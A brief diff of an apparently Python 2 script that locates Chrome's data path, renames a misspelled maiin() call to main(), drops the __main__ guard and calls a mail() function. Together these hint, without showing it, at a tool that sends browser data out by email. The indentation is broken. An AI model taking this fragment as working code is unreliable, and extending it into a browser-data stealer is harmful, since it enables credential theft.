@@ -136,14 +136,11 @@ def getpath():
                 print '[!] Chrome Doesn\'t exists'
                 sys.exit(0)
     
-    return PathName            
-
-
-if __name__ == '__main__':
+    return PathName        
 
 
     
  mail()
- maiin()
+ main()
 
      
